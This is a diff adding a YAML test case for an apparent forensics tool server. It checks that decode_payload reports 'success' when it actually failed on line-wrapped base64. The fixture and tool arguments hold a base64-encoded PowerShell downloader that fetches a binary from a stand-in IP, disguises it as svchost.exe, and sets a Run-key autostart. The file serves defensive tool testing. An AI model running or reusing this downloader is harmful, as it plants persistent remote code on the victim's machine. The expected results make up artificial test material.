@@ -1,0 +1,66 @@
+# Matrix case P4101-024: decode_payload puts its own failure text into
+# results.decoded ("[unknown encoding: ...]", "[base64 decode failed: ...]",
+# "[hex decode failed: ...]", "[utf16le decode failed: ...]") and still answers
+# status "success". Here the input is the body of a `certutil -encode` file,
+# wrapped at 64 characters: auto detection uses b64decode(validate=True), which
+# rejects the line breaks, so the encoding is "unknown".
+case_id: P4101-024
+problem: P4101
+server: mulder
+variant: mulder-3164843
+commit: 3164843baf74c7fe69e7121dbd6150f8f77ce660
+display: multi-call
+level: mcp
+realism: common
+realism_ko: "`certutil -encode`나 메일 첨부처럼 64·76자마다 줄을 바꾼 base64는 흔하고, 파일에서 읽은 그대로 `encoding` 기본값(auto)으로 넘기는 것이 자연스럽다."
+coverage: "partial: the unknown-encoding path is shown; the hex, base64 and utf16le decode-failure texts are returned the same way but not shown"
+coverage_ko: "알 수 없는 인코딩 경로만 보인다. hex·base64·utf16le 디코딩 실패 문구도 같은 방식으로 돌아오지만 보이지 않는다."
+summary: >-
+  decode_payload on the base64 body of a certutil -encode file (64-character lines) with the default encoding auto answers status success with decoded "[unknown encoding: unknown]"; the same text with encoding base64 decodes to the PowerShell downloader.
+summary_ko: "`certutil -encode` 파일의 base64 본문(64자 줄)을 기본값 `encoding: auto`로 `decode_payload`에 넣으면 `status: success`에 `decoded`가 `[unknown encoding: unknown]`이다. 같은 문자열을 `encoding: base64`로 주면 PowerShell 다운로더가 풀린다."
+defect_ko: "이 서버는 디코딩하지 못했을 때 실패 문구를 결과(`decoded`) 자리에 넣고 `status: success`로 답한다. 정상이라면 실패를 `status: error`로 알려야 한다. 상태로 판단하는 모델은 디코딩이 끝났다고 보고, 이 페이로드를 해독할 수 없는 값으로 잘못 안다."
+setup_ko: "`certutil -encode`로 만든 형식(BEGIN/END 줄, 64자 줄바꿈)의 PowerShell 다운로더 파일 `Users/Public/Downloads/upd.txt`를 넣었다."
+fixture:
+  - path: Users/Public/Downloads/upd.txt
+    hex: 2d2d2d2d2d424547494e2043455254494649434154452d2d2d2d2d0d0a4a4855675053416e6148523063446f764c7a49774d7934774c6a45784d7934334c3356775a4746305a5335696157346e43695277494430674969526c626e59360d0a51564251524546555156784e61574e7962334e765a6e526356326c755a4739336331787a646d4e6f62334e304c6d56345a53494b4b45356c64793150596d706c0d0a59335167546d56304c6c646c596b4e736157567564436b7552473933626d7876595752476157786c4b4352314c43416b63436b4b546d56334c556c305a5731510d0a636d39775a584a3065534174554746306143416e53457444565470635532396d64486468636d566354576c6a636d397a62325a3058466470626d527664334e630d0a51335679636d567564465a6c636e4e7062323563556e56754a794174546d46745a53416e56326c755658426b5958526c4a794174566d4673645755674a4841670d0a4c555a76636d4e6c436c4e3059584a304c56427962324e6c63334d674a48414b0d0a2d2d2d2d2d454e442043455254494649434154452d2d2d2d2d0d0a
+steps:
+  - tool: scan_evidence
+    note_ko: "준비: 사건 만들기"
+    args:
+      evidence_path: ${EVIDENCE}
+      case_id: p4101-024
+  - tool: read_evidence_file
+    note_ko: "준비: 파일 내용 읽기"
+    args:
+      file_path: ${EVIDENCE}/Users/Public/Downloads/upd.txt
+  - tool: decode_payload
+    note_ko: "결함 호출: 파일의 base64 본문을 기본값(auto)으로 디코딩"
+    args:
+      data: |-
+        JHUgPSAnaHR0cDovLzIwMy4wLjExMy43L3VwZGF0ZS5iaW4nCiRwID0gIiRlbnY6
+        QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xzdmNob3N0LmV4ZSIKKE5ldy1PYmpl
+        Y3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCR1LCAkcCkKTmV3LUl0ZW1Q
+        cm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3Nc
+        Q3VycmVudFZlcnNpb25cUnVuJyAtTmFtZSAnV2luVXBkYXRlJyAtVmFsdWUgJHAg
+        LUZvcmNlClN0YXJ0LVByb2Nlc3MgJHAK
+  - tool: decode_payload
+    note_ko: "비교 호출: 같은 문자열을 `encoding: base64`로 디코딩"
+    args:
+      data: |-
+        JHUgPSAnaHR0cDovLzIwMy4wLjExMy43L3VwZGF0ZS5iaW4nCiRwID0gIiRlbnY6
+        QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xzdmNob3N0LmV4ZSIKKE5ldy1PYmpl
+        Y3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCR1LCAkcCkKTmV3LUl0ZW1Q
+        cm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3Nc
+        Q3VycmVudFZlcnNpb25cUnVuJyAtTmFtZSAnV2luVXBkYXRlJyAtVmFsdWUgJHAg
+        LUZvcmNlClN0YXJ0LVByb2Nlc3MgJHAK
+      encoding: base64
+expect:
+  - step: 3
+    note_ko: "응답 상태는 성공이다"
+    contains: '"status": "success"'
+  - step: 3
+    note_ko: "결과 자리에는 디코딩 결과가 아니라 실패 문구가 있다"
+    contains: '"decoded": "[unknown encoding: unknown]"'
+  - step: 4
+    note_ko: "같은 문자열은 정상 base64이고 PowerShell 다운로더로 풀린다"
+    contains: "DownloadFile"
